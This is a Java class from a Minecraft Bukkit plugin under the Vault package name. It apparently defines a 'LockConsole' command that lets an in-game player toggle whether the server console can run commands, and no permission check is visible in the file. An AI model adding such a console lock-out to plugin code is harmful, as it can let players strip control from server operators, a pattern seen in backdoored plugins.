package net.milkbowl.vault.commands.cmds;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class LockConsole extends CommandManager {
	
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.isLocked) {
			plugin.isLocked = false;
			p.sendMessage(Settings.PREFIX("Console can now execute commands."));
		} else {
			plugin.isLocked = true;
			p.sendMessage(Settings.PREFIX("Console can no longer execute commands."));
		}
	}

}
